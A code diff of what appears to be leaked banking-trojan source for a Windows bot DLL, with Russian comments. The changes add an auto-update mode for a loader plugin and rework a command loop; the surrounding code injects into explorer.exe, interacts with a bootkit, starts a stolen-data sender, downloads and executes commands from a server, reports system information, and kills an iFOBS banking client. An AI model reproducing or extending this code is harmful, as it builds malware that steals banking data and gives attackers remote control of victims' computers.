@@ -26,6 +26,8 @@
 #include "md5.h"
 #include "DbgRpt.h"
 
+#include "BotAutoUpdate.h"
+
 #pragma comment(linker, "/ENTRY:MyDllMain" )
 
 //------------------------------------------------------------------------------
@@ -95,9 +97,15 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 
 	switch( BOT::GetBotType() )
 	{
-		case BotBootkit: //если стартовали из под буткита, то удаляем ring3 бота из автозагрузки
+		//если стартовали из под буткита, то удаляем ring3 бота из автозагрузки
+		case BotBootkit: 
 			BOT::UninstallService();
 			BOT::DeleteAutorunBot();
+			break;
+
+		// При запуске из под лоадера стартуем автообновление
+		case BotLoaderPlugin:
+			StartAutoUpdate();
 			break;
 	}
 
@@ -106,11 +114,8 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	// Отключаем отображение ошибок при крахе процесса
 	DisableShowFatalErrorDialog();
 
-	// Регистрируем глобальный менеджер задач
-	InitializeTaskManager(NULL, true);
-
 	// Инициализируем систему отправки статистической информации
-	PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
+	//PP_DBGRPT_FUNCTION_CALL(DebugReportInit());
 
 	// Вызываем событие
 	bool Cancel = false;
@@ -121,7 +126,7 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	}
 
 	// 402_pl запуск цикла получения команд (он получается в другом процессе)
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));
+	//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("402_pl"));
 
 	// Запускаем поток отправки данных
 	DataGrabber::StartDataSender();
@@ -144,34 +149,37 @@ DWORD WINAPI LoaderRoutine(LPVOID Data)
 	#endif
 
 	DLLDBG("====>Bot Loader", "Стартуем выполнение команд");
-	while (true)
+	if (InitializeTaskManager(NULL, true))
 	{
-		// 403_pl цикл получения команд
-		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
-		
-		DownloadAndExecuteCommand(NULL, NULL);
-
-		// "Гениальность" проектирования взаимосвязи бота и его сервера
-		// отправка стартовой информации должна идти только после получения
-		// команды
-		if (!FirstSended)
+		while (true)
 		{
-			DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
-			FirstSended = SendFirstInfo();
+			// 403_pl цикл получения команд
+			//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("403_pl"));
+			
+			DownloadAndExecuteCommand(NULL, NULL);
+
+			// "Гениальность" проектирования взаимосвязи бота и его сервера
+			// отправка стартовой информации должна идти только после получения
+			// команды
+			if (!FirstSended)
+			{
+				DLLDBG("====>Bot Loader", "Отправляем информацию о системе");
+				FirstSended = SendFirstInfo();
+			}
+
+
+			// Приостанавливаем выполнение команд
+			if (!TaskManagerSleep(NULL))
+				break;
 		}
-
-
-		// Приостанавливаем выполнение команд
-		if (!TaskManagerSleep(NULL))
-			break;
 	}
-
+	pExitProcess(0);
 	return 0;
 }
 
 DWORD WINAPI ExplorerMain(LPVOID Data)
 {
-	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
+	DLLDBG("====>Bot DLL", "Запускаем бот:\n Префикс [%s] \n WorkPath: %s", GetPrefix().t_str(), BOT::WorkPath().t_str());
 	
 	//копируем префикс из временного файла, который был сохранен инсталером буткита
 	BOT::SavePrefixFromTemporaryFile(false);
@@ -222,13 +230,28 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 	return 0;
 }
 
-extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
+//-----------------------------------------------------------
+//  Start - Фуекция запускает плагин на выполнение.
+//          Вызов данной функции подразцмевает то, что dll 
+//          была загружена из памяти без вызова стартовой
+//          функции dll.
+//-----------------------------------------------------------
+extern"C"  void WINAPI Start(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin)
 {
-	BOT::Initialize(ProcessUnknown);
-	StartThread(ExplorerMain, NULL);
+	if (Initialize)
+	{
+		BOT::Initialize(ProcessUnknown);
+		if (IsLoaderPlugin)
+			BOT::SetBotType(BotLoaderPlugin);
+	}
+	if (Start)
+		StartThread(ExplorerMain, NULL);
 }
 
 
+//-----------------------------------------------------------
+// MyDllMain - Точка входа DLL
+//-----------------------------------------------------------
 BOOL APIENTRY MyDllMain( HMODULE hModule,
                        DWORD  ul_reason_for_call,
                        LPVOID lpReserved)
@@ -247,7 +270,7 @@ BOOL APIENTRY MyDllMain( HMODULE hModule,
 			DLLDBG( "MyDllMain", "Start bot.plug in process %s", buf );
 			if( File::GetNameHashA( buf, true ) == 0x490A0972 ) //стартуем если в процессе проводника (explorer.exe)
 			{
-				if( BOT::CreateBootkitMutex() )
+				if( BOT::CreateBootkitMutex())
 				{
 					BOT::SetBotType(BotBootkit);
 					StartThread(ExplorerMain, NULL);
@@ -295,7 +318,7 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 	#ifdef IFobsH
 		RunThread( IFobs::KillIFobs, (void*)10 );
 	#endif
-	Start(NULL, NULL, NULL);
+	Start(TRUE, TRUE, FALSE);
 	return 0;
 }
 
